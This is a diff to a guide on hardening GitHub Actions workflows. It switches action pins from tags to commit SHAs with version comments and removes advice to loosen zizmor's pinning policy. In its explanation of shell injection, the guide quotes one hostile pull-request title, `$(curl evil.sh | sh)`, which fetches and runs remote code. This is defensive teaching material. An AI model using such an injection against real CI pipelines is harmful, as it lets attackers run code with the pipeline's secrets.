@@ -104,7 +104,7 @@ stays readable by everything the job runs afterward.
 
 ```yaml
 - name: Check out repository
-  uses: actions/checkout@<version>
+  uses: actions/checkout@<sha>  # <version>
   with:
     persist-credentials: false
 ```
@@ -139,26 +139,28 @@ the environment variable inside the script:
 titled `$(curl evil.sh | sh)` executes. An env var is data the shell never
 re-parses.
 
-zizmor's `unpinned-uses` audit defaults to demanding SHA pins, so it flags
-patch-version tags. Keep the tags (see below) and relax the policy in
-`zizmor.yml`:
-
-```yaml
-rules:
-  unpinned-uses:
-    config:
-      policies:
-        "*": ref-pin
-```
-
-`ref-pin` accepts any explicit tag or SHA while still flagging a floating
-`@main`.
+zizmor's `unpinned-uses` audit demands SHA pins (see below) for every action by
+default, first-party `actions/*` included, so a tag pin anywhere fails the audit
+with no config. Don't relax its `policies` to `ref-pin` in `zizmor.yml`.
 
 ## Action Version Pinning
 
-Pin to full patch versions, not floating major tags. `@v4` drifts; `@v4.2.2`
-is reproducible. Always update to the latest available patch when writing a new
-workflow.
+Pin every action to a full commit SHA, with the version it resolves to in a
+trailing comment:
+
+```yaml
+uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
+```
+
+A tag is a mutable pointer: whoever controls the action's repo can move
+`v7.0.1` to different code after you've reviewed it, and every workflow that
+names the tag runs the new code on its next trigger. A SHA can't be moved.
+Dependabot's `github-actions` ecosystem updates SHA pins and rewrites the
+version comment, so its cooldown still applies and the pin costs no upkeep.
+
+Resolve a tag to its commit (dereferencing an annotated tag) with
+`gh api repos/<owner>/<repo>/commits/<tag> --jq .sha`, and use the latest
+release that has cleared the cooldown when writing a new workflow.
 
 Commonly used actions:
 
@@ -170,9 +172,6 @@ Commonly used actions:
 | `pypa/gh-action-pypi-publish` | Publish to PyPI |
 | `actions/upload-artifact` / `download-artifact` | Artifact passing between jobs |
 | `actions/upload-pages-artifact` / `actions/deploy-pages` | GitHub Pages deploy |
-
-Check the current release version in the action's GitHub repo before writing
-the `uses:` line.
 
 ## Names
 
@@ -250,15 +249,15 @@ jobs:
       PIP_DISABLE_PIP_VERSION_CHECK: 1
     steps:
       - name: Check out repository
-        uses: actions/checkout@<version>
+        uses: actions/checkout@<sha>  # <version>
         with:
           persist-credentials: false
 
       - name: Install Just
-        uses: extractions/setup-just@<version>
+        uses: extractions/setup-just@<sha>  # <version>
 
       - name: Install uv
-        uses: astral-sh/setup-uv@<version>
+        uses: astral-sh/setup-uv@<sha>  # <version>
         with:
           python-version: ${{ matrix.python-version }}
           enable-cache: true
@@ -302,12 +301,12 @@ jobs:
       id-token: write
     steps:
       - name: Check out repository
-        uses: actions/checkout@<version>
+        uses: actions/checkout@<sha>  # <version>
         with:
           persist-credentials: false
 
       - name: Install uv
-        uses: astral-sh/setup-uv@<version>
+        uses: astral-sh/setup-uv@<sha>  # <version>
         with:
           enable-cache: false  # don't restore a cache into a publish job
 
@@ -315,7 +314,7 @@ jobs:
         run: uv build -vvv
 
       - name: Publish package distributions to PyPI
-        uses: pypa/gh-action-pypi-publish@<version>
+        uses: pypa/gh-action-pypi-publish@<sha>  # <version>
 ```
 
 `id-token: write` grants the OIDC exchange. The `contents: read` comment is
@@ -352,10 +351,10 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Check out repository
-        uses: actions/checkout@<version>
+        uses: actions/checkout@<sha>  # <version>
 
       - name: Install uv
-        uses: astral-sh/setup-uv@<version>
+        uses: astral-sh/setup-uv@<sha>  # <version>
         with:
           enable-cache: true
 
